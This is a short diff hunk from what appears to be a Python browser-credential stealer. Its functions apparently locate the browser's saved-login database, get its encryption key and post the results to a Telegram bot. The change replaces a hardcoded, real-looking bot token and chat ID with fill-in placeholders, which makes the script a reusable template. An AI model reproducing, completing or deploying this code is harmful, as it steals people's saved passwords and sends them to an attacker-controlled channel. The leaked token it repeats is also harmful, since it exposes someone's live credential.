@@ -68,8 +68,8 @@ def send_to_telegram(message, token, chat_id):
     requests.post(url, data=payload)
 
 def main():
-    TOKEN = '7027831990:AAGAhPMTVemd6Np-ww0FHqd4I5HkLsYZP2I'
-    CHAT_ID = '-1002057497483'
+    TOKEN = 'Your_Token'
+    CHAT_ID = '-100 + Your_ChadId'
     
     key = get_encryption_key()
     db_path = find_login_data_path()
